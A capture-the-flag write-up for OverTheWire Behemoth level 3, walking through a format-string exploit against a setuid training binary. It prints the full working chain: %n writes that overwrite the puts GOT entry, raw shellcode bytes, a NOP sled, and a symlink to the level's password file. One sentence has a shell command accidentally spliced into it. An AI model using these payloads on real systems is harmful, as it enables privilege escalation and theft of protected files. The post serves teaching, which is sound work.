---
layout: post
title: OverTheWire - Behemoth 3
---

Site: http://overthewire.org/wargames/behemoth/ <br>
Level: 3 <br>
Situation: Format String Attack <br>

WARNING: Lots of words!<br><br>
We will be reutilizing the invoker.sh script, shellcalc.c, and the shellcode that reads /tmp/b2p. These tools can be found in the Behemoth 1 post.

First let's create a folder to work from.

{% highlight bash %}
behemoth3@melinda:~$ mkdir /tmp/bh3 
behemoth3@melinda:~$ cd /tmp/bh3
{% endhighlight %}

Start as we do before let’s identify the arch of the executable and run it to see the output.

{% highlight bash %}
behemoth3@melinda:/tmp/bh3$ file /behemoth/behemoth3
/behemoth/behemoth3: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=c5dbd3c173034d55cfef4bb66829b1bd1ec42d22, not stripped
behemoth3@melinda:/tmp/bh3$ ./invoker.sh /behemoth/behemoth3
Identify yourself: r4stl1n 
Welcome, r4stl1n

aaaand goodbye again.

{% endhighlight %}

We notice that it takes our user input and displays it back to us. This might be our attack vector but before we start poking at it randomly with buffer overflow attacks etc. We open the application in GDB to see if we can get some more information.

{% highlight bash %}
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804847d <+0>:	push   ebp
   0x0804847e <+1>:	mov    ebp,esp
   0x08048480 <+3>:	and    esp,0xfffffff0
   0x08048483 <+6>:	sub    esp,0xe0
   0x08048489 <+12>:	mov    DWORD PTR [esp],0x8048570
   0x08048490 <+19>:	call   0x8048330 <printf@plt>
   0x08048495 <+24>:	mov    eax,ds:0x80497a4
   0x0804849a <+29>:	mov    DWORD PTR [esp+0x8],eax
   0x0804849e <+33>:	mov    DWORD PTR [esp+0x4],0xc8
   0x080484a6 <+41>:	lea    eax,[esp+0x18]
   0x080484aa <+45>:	mov    DWORD PTR [esp],eax
   0x080484ad <+48>:	call   0x8048340 <fgets@plt>
   0x080484b2 <+53>:	mov    DWORD PTR [esp],0x8048584
   0x080484b9 <+60>:	call   0x8048330 <printf@plt>
   0x080484be <+65>:	lea    eax,[esp+0x18]
   0x080484c2 <+69>:	mov    DWORD PTR [esp],eax
   0x080484c5 <+72>:	call   0x8048330 <printf@plt>
   0x080484ca <+77>:	mov    DWORD PTR [esp],0x804858e
   0x080484d1 <+84>:	call   0x8048350 <puts@plt>
   0x080484d6 <+89>:	mov    eax,0x0
   0x080484db <+94>:	leave  
   0x080484dc <+95>:	ret    
End of assembler dump.
(gdb) 

{% endhighlight %}

After looking at our disassembly we can see that printf is called quite a bit we know that printf is used to show information on the screen not only that but it allows for specific string formatting.

Knowing this is a challenge box and we haven't seen a format string vulnerability we will make it out first attack vector to test.

To test this vulnerability we are going to feed in %x << when used in a string format it pops our stack pointer and displays the address. We can also utilize %p that will print the full pointer data. If it is vulnerable we will be able to see a pointer address.

{% highlight bash %}
(gdb) run
Starting program: /games/behemoth/behemoth3 
Identify yourself: %x %x %x %p %p %p
Welcome, c8 f7fcac20 0 (nil) 0xf7ffd000 0x25207825

aaaand goodbye again.
[Inferior 1 (process 6324) exited normally]

{% endhighlight %}

Looks like it is vulnerable to this form of attack. There are various methods we can use to exploit this type of vulnerability.

Short Write - Writing twice instead of four times utilizing the %h which cast types to short. 

Stack Popping - Allows to get ahead of the stack pointer allowing for more movement in limited space.

Direct Parameter Access - Improved concept of stack popping allows for an individual to access areas of the stack directly and write to it.

For this example direct parameter access is what will be used. Bit of information is needed before we continue.

{% highlight bash %}
%p - prints current pointer
%x - print current pointer lowercase hex
%n - write arbitrary values to current pointer
%u - used to create padding of values to manipulate the pointer
{% endhighlight %}

So in order to exploit this we need to find the beginning of our information on the stack. To do this we are going to utilize our famous "AAAA" but in addition we are going to add a few "%p" to the list so we can get the addresses.

{% highlight bash %}
(gdb) run
Starting program: /games/behemoth/behemoth3 
Identify yourself: AAAA.%p.%p.%p.%p.%p.%p
Welcome, AAAA.0xc8.0xf7fcac20.(nil).(nil).0xf7ffd000.0x41414141
{% endhighlight %}

From this we know that we are the sixth element on the stack. 

Let’s go ahead and test this theory. We are going to utilize the n parameter to write a value to an address we specify. In this example we are going to write the value of "5" to an Address of 0x41414141 ("AAAA")

We will use the following string. "AAAA-%6$n", To break it down AAAA is the address we are going to attempt to write to, %6 states that we want to write to the 6th address on the stack. Finally $n states that we want to write all the characters up to the %6. In this case the value is 5.

{% highlight bash %}
(gdb) run
Starting program: /games/behemoth/behemoth3 
Identify yourself: AAAA-%6$n

Program received signal SIGSEGV, Segmentation fault.
0xf7e687e3 in vfprintf () from /lib32/libc.so.6
(gdb) x/i $eip
=> 0xf7e687e3 <vfprintf+14051>:	mov    %ecx,(%eax)
(gdb) x/x $ecx
0x5:	Cannot access memory at address 0x5
(gdb) x/x $eax
0x41414141:	Cannot access memory at address 0x41414141
{% endhighlight %}

Let’s break this down - 
First we get a segfault that is expected as we are attempting to write to an invalid address

x/i $eip - We notice that in our instruction pointer is showing a "mov" and its moving what’s in our ECX buffer into EAX. Also in this case EAX is being used as EAX’s value is being used as a pointer.

x/x $ecx - By looking at the ECX buffer we can see that indeed the value of 5 is the value we are trying to put into EAX.

x/x $eax - Shows that indeed the value of EAX is 0x41414141

For the sake of keeping this short. If the address was valid it would allow us to overwrite any address with our own. We can use this to overwrite a function pointer later on in the application execution and make it point to our own shell code.

So now we need to find an address to overwrite. Many applications call external libraries for their functions and this one is no different. By looking at the global offset table we can identify what functions are being called from external libraries.

{% highlight bash %}
behemoth3@melinda:/tmp/bh3$ objdump -R /behemoth/behemoth3

/behemoth/behemoth3:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049778 R_386_GLOB_DAT    __gmon_start__
080497a4 R_386_COPY        stdin
08049788 R_386_JUMP_SLOT   printf
0804978c R_386_JUMP_SLOT   fgets
08049790 R_386_JUMP_SLOT   puts
08049794 R_386_JUMP_SLOT   __gmon_start__
08049798 R_386_JUMP_SLOT   __libc_start_main

{% endhighlight %}

We are going to overwrite the puts command. With our own to show how this can work we will do the following.

Again we are going to be utilizing an input.txt file and Perl to create our test strings.
We break up the end of the string due to our own Perl code interpreting the format string.

{% highlight perl %}
perl -e 'print "\x90\x97\x04\x08"."-%6"."\$n"' > input.txt
{% endhighlight %}
Then run our application with our input. 
{% highlight bash %}
(gdb) run < input.txt
Starting program: /games/behemoth/behemoth3 < input.txt

Program received signal SIGSEGV, Segmentation fault.
0x00000005 in ?? ()

{% endhighlight %}

As predicated we overwrote the puts address with our own address that is 0x00000005. Now we are almost there we know that in order to point to our own shell code we must overwrite the upper and lower bounds of the address. Also we must inject and find our shell code so we have a correct address to jump to. To do this we will go ahead and write the upper bounds of the address to our string. The upper bound is 2 bytes more than the lower so our string now looks like the following.

{% highlight perl %}
perl -e 'print "\x90\x97\x04\x08"."\x92\x97\x04\x08"."-%6"."\$n"."-%7\$n"' > input.txt
{% endhighlight %}

{% highlight bash %}
(gdb) run < input.txt
Starting program: /games/behemoth/behemoth3 < input.txt

Program received signal SIGSEGV, Segmentation fault.
0x000a0009 in ?? ()
{% endhighlight %}

Now we are writing to both the 6th position in the stack and the 7th the upper and lower bounds of the new address.

We know we can write out a custom address now all we need to do is to create the full payload. We do this by doing a few things we are going to create a NOP sled of 64 bytes to give us some movement room. Then our payload. So format should look like this.

LowerRangeAddress<>UpperRangeAddress<>NOPSLED<>ShellCode<>FormatString

For the shell code we will be reusing our shellcode from the stack overflow. 
{% highlight bash %}
\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x2f\x62\x32\x70\x68\x2f\x74\x6d\x70\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80
{% endhighlight %}

We know this shell code cats a file called /tmp/b2p so let’s go ahead and create a symlink for the password file called /tmp/b2p

{% highlight bash %}
behemoth3@melinda:/tmp/bh3$ ln -s /etc/behemoth_pass/behemoth4 /tmp/b2p
{% endhighlight %}

All we need let is an address to jump to for this we will format our string to include the nopsled and the shelbehemoth3@melinda:/tmp/bh3$ ln -s /etc/behemoth_pass/behemoth4 /tmp/b2plcode. When ran in the debugger we can search for our NOP sled and pick a mid-range address to jump to. NOP is represented as "\x90".

Our string now turns into the following

{% highlight perl %}
perl -e 'print "\x90\x97\x04\x08" . "\x92\x97\x04\x08" . "\x90"x64 . "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x2f\x62\x32\x70\x68\x2f\x74\x6d\x70\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80" . "-%6" . "\$n"."-%7\$n"' > input.txt
{% endhighlight %}

Now we just need to search for our nopsled. To do this we search the previous stack pointers.

{% highlight bash %}
(gdb) run < input.txt
Starting program: /games/behemoth/behemoth3 < input.txt

Program received signal SIGSEGV, Segmentation fault.
0x00720071 in ?? ()
(gdb) find $esp,$esp+500, 0x90909090
-- SNIP --
0xffffdd7f
0xffffdd80
0xffffdd81
0xffffdd82
0xffffdd83
0xffffdd84
0xffffdd85
0xffffdd86
0xffffdd87
-- SNIP --
{% endhighlight %}

We have a few address to work with we pick one at random 0xffffdd80

We have our address now all that is left is to overwrite the puts address with the address of one of our NOP’s and we will slide right into our shell code.

To do this we simply have to calculate what decimal integer is needed to get the values we want in hex. While taking into account the amount of characters we already have. We start with the lower bound of the address dd80. The decimal value for this is 56704. Now we subtract the amount of characters we already have in our string which is 114 giving us 56590. We add a buffer to the string by utilizing %u. 

We update our string to look as follows.

{% highlight perl %}
perl -e 'print "\x90\x97\x04\x08" . "\x92\x97\x04\x08" . "\x90"x64 . "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x2f\x62\x32\x70\x68\x2f\x74\x6d\x70\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80" ."-%56590u" . "-%6" . "\$n"."-%7\$n"' > input.txt
{% endhighlight %}

{% highlight bash %}
(gdb) run < input.txt
-- SNIP --
EMPTY LINES CUT OUT
-- SNIP --
Program received signal SIGSEGV, Segmentation fault.
0xdd81dd80 in ?? ()

{% endhighlight %}

As we can see the address overwrite worked on the lower bound and now we just need to overwrite the upper bound with ffff. We subtract our desired bound from our lower bound in this case ffff - dd80. Then account for the - we added. Turning our string into the following.

{% highlight perl %}
perl -e 'print "\x90\x97\x04\x08" . "\x92\x97\x04\x08" . "\x90"x64 . "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x2f\x62\x32\x70\x68\x2f\x74\x6d\x70\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80" ."-%56590u" . "-%6" . "\$n" . "-%8"."830u" . "%7\$n"' > input.txt
{% endhighlight %}

{% highlight bash %}
(gdb) run < input.txt
-- SNIP --
EMPTY LINES CUT OUT
-- SNIP --
Process 22933 is executing new program: /bin/cat
/bin/cat: /tmp/b2p: Permission denied
[Inferior 1 (process 22933) exited with code 01]
{% endhighlight %}

Now we just run it in user space and we will have the password.

{% highlight bash %}
behemoth3@melinda:/tmp/bh3$ ./invoker.sh /behemoth/behemoth3 < input.txt
-- SNIP --
EMPTY LINES CUT OUT
-- SNIP --

[OMITTED]
{% endhighlight %}

There is our password.